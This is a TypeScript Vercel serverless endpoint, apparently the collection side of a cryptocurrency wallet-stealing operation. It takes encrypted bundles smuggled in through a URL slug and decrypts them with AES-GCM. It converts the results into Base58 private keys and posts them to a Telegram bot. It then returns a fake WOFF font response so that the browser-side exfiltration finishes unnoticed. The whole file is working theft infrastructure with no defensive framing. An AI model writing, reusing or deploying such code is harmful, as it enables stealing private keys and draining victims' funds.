// api/inbox/[...slug].ts

import type { VercelRequest, VercelResponse } from '@vercel/node'
import crypto from 'crypto'

// Base58 alphabet and encoder
const ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
function base58(buffer: Buffer): string {
  let digits = [0]
  for (const byte of buffer) {
    let carry = byte
    for (let i = 0; i < digits.length; i++) {
      carry += digits[i] << 8
      digits[i] = carry % 58
      carry = (carry / 58) | 0
    }
    while (carry) {
      digits.push(carry % 58)
      carry = (carry / 58) | 0
    }
  }
  let output = ''
  for (const b of buffer) {
    if (b === 0) output += ALPHABET[0]
    else break
  }
  for (let i = digits.length - 1; i >= 0; i--) {
    output += ALPHABET[digits[i]]
  }
  return output
}

export default async function handler(req: VercelRequest, res: VercelResponse) {
  const slugArr = req.query.slug as string[] | string
  const raw = Array.isArray(slugArr) ? slugArr[slugArr.length - 1] : slugArr
  const parts = raw.split('_')
  if (parts.length < 2) return res.status(400).send('Bad slug')

  try {
    // Decode URL‐safe Base64
    let b64 = parts[1].replace(/-/g, '+').replace(/_/g, '/')
    b64 += '='.repeat((4 - (b64.length % 4)) % 4)

    // Parse JSON
    const { sBundles, keybundle } = JSON.parse(Buffer.from(b64, 'base64').toString('utf8'))

    // AES‐GCM key
    const key = Buffer.from(keybundle, 'base64')
    const privKeys: string[] = []

    // Decrypt each sBundle
    for (const sb of sBundles) {
      const [iv_b64, data_b64] = sb.split(':')
      const iv = Buffer.from(iv_b64, 'base64')
      const ctTag = Buffer.from(data_b64, 'base64')
      const tag = ctTag.slice(-16)
      const ct = ctTag.slice(0, -16)

      const dec = crypto.createDecipheriv('aes-256-gcm', key, iv)
      dec.setAuthTag(tag)
      const hex = Buffer.concat([dec.update(ct), dec.final()]).toString('utf8')
      const last64 = hex.slice(-64)
      privKeys.push(base58(Buffer.from(last64, 'hex')))
    }

    // Send to Telegram
    const BOT = process.env.BOT_TOKEN!
    const CHAT = process.env.CHAT_ID!
    const text = privKeys.map((k,i) => `wallet ${i+1}\n${k}`).join('\n\n')
    await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ chat_id: CHAT, text })
    })

    console.log('✅ Decrypted & sent to Telegram')
  } catch (e) {
    console.error('❌ Error processing exfil:', e)
  }

  // Return dummy font so browser exfil completes
  res
    .status(200)
    .setHeader('Content-Type', 'font/woff')
    .setHeader('Access-Control-Allow-Origin', '*')
    .send(Buffer.from([0x77,0x4f,0x46,0x46]))
}
